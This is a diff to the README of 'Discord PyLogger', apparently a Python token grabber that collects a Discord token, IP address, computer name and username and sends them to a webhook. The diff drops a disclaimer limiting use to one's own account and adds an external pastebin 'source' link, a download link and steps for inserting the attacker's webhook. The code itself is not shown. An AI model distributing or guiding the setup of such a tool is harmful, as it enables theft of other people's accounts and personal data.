@@ -1,7 +1,7 @@
 # Discord PyLogger
 Discord Python Logger, Easy setup!
 
-Made to find your discord token any other use to hack someone is not allowed and you may get your account banned. 
+Dont trust this? How about you look at the source yourself. [Source Code](https://pastebin.com/raw/RHA0KGcq) 
 
 # Features
 - Log's Discord App Token
@@ -10,12 +10,14 @@ Made to find your discord token any other use to hack someone is not allowed and
 - Grabs IP, Computer Name, Username of PC etc.
 
 # Setup
-1. Download the python file
+1. How to get started download it - [Download Discord Pylogger](https://github.com/Dxrkzen/PyLogger/archive/refs/tags/1.2.zip)
+(Make sure you have python 3.9 or above! [Python 3.9](https://www.python.org/downloads/release/python-390/)) 
 2. Right-Click the .py file
 3. Press "Edit with Idle"
 4. Scroll Down to the bottom
 5. When you see "Your Webhook Here", enter your webhook!
-6. Press Ctrl+S and you can use it to find your token! 
+6. Press Ctrl+S and you can use it to find your token!
+(You can do ctrl+f and search for webhook to find it easier)
 -------------------------------------------------------
 How to make a webhook!
 
